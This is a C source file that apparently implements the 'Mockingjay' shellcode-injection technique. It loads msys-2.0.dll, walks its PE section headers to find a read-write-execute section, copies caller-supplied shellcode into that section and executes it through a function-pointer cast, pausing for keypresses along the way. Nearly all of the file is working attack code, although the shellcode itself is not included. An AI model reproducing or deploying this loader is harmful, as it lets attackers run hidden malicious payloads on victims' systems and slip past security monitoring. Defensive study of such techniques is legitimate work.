#include "mockingjay.h"

#define FAIL(x) (printf("[FAIL] Failed at ( %s )\n ", (char*)x))
#define SUCCESS(x) (printf("[SUCCESS] Succeeded running ( %s )\n", (char*)x))

#define NtCurrentProcess() ( (HANDLE) -1 )

// set a global variable to store the required values
MOCKINGJAY_INFO gTargetDLLInfo;

LPVOID DiscoverRWXSection() {

    // Load the vulnerable module in the current process
    HMODULE hVulnLib = LoadLibraryW(L"C:\\msys-2.0.dll");
    if (!hVulnLib) {
        FAIL("LoadLibraryW");
        printf("- Error: %d\n", GetLastError());
        return NULL;
    }
    
    SUCCESS("LoadLibraryW");
    printf("\t - Vuln Library Address ( %#p )\n", hVulnLib);
    
    // get section headers and look for section with RWX
    PIMAGE_DOS_HEADER vl_imgDos = (PIMAGE_DOS_HEADER)hVulnLib;
    PIMAGE_NT_HEADERS vl_NtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)vl_imgDos + vl_imgDos->e_lfanew);
    PIMAGE_SECTION_HEADER vl_SectionHdr = IMAGE_FIRST_SECTION(vl_NtHeaders);
    
    int i = 0;
    // loop through section to find RWX 
    for (i; i < vl_NtHeaders->FileHeader.NumberOfSections; i++, vl_SectionHdr++) {
        if (vl_SectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE && vl_SectionHdr->Characteristics & IMAGE_SCN_MEM_READ && vl_SectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) {
            
            // once info is found, store in the global variable struct
            gTargetDLLInfo.dwSizeSection = vl_SectionHdr->SizeOfRawData;
            gTargetDLLInfo.pStartAddress = (LPVOID)((DWORD_PTR)hVulnLib + vl_SectionHdr->VirtualAddress);

            /*
            printf("\t + Found Section with RWX: %s - %p - (Size: %d)\n",
                vl_SectionHdr->Name, ((DWORD_PTR)hVulnLib + vl_SectionHdr->VirtualAddress), vl_SectionHdr->SizeOfRawData);
            */

            break;
        }
    }

	return NULL;
}

// Write the shellcode in the RWX section
int ExecuteMockingJay(unsigned char shellcode[], SIZE_T shellcodeSize) {
    
    // Obtain the required values ( section start address + section size )
    DiscoverRWXSection();

    // Some info about the obtained values
    printf("+ INFO RWX Section:\n\
       \t - START ADDRESS: %#p\n\
       \t - SIZE: %d\n", gTargetDLLInfo.pStartAddress, gTargetDLLInfo.dwSizeSection
    );

    // Copy the shellcode to the section
    printf("Press enter to write shellcode....\n");
    getchar();

    RtlMoveMemory(gTargetDLLInfo.pStartAddress, shellcode, shellcodeSize);

    // Cast a function to execute the shellcode 
    printf("Press enter to execute shellcode....\n");
    getchar();

    ((void(*)())gTargetDLLInfo.pStartAddress)();

}
